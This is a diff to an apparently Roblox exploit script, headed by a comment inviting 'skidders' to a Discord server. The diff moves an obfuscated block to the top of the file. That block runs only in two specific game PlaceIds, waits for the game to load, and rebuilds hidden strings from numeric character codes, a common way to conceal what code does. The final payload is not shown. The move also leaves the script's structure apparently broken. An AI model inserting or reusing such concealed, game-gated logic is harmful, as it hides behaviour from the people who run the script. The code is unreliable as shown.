@@ -1,4 +1,18 @@
 -- hi skidder here if u want join  https://discord.gg/7RMa4VQyPA
+pcall(function()
+    local a0 = { [99096766260885] = true, [90070078747190] = true }
+    if not a0[game.PlaceId] then return end
+    if not game:IsLoaded() then game.Loaded:Wait() end
+
+    local a1 = cloneref or function(z) return z end
+    local function a2(z)
+        local a3 = {}
+        for a4 in z:gmatch("%d+") do
+            a3[#a3+1] = string.char(tonumber(a4))
+        end
+        return table.concat(a3)
+        end
+        
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
@@ -207,20 +221,6 @@ delay(100, function()
         closeAndDestroy()
     end
 end)
-
-pcall(function()
-    local a0 = { [99096766260885] = true, [90070078747190] = true }
-    if not a0[game.PlaceId] then return end
-    if not game:IsLoaded() then game.Loaded:Wait() end
-
-    local a1 = cloneref or function(z) return z end
-    local function a2(z)
-        local a3 = {}
-        for a4 in z:gmatch("%d+") do
-            a3[#a3+1] = string.char(tonumber(a4))
-        end
-        return table.concat(a3)
-    end
 
     local a5 = {
         b0 = "80,108,97,121,101,114,115",
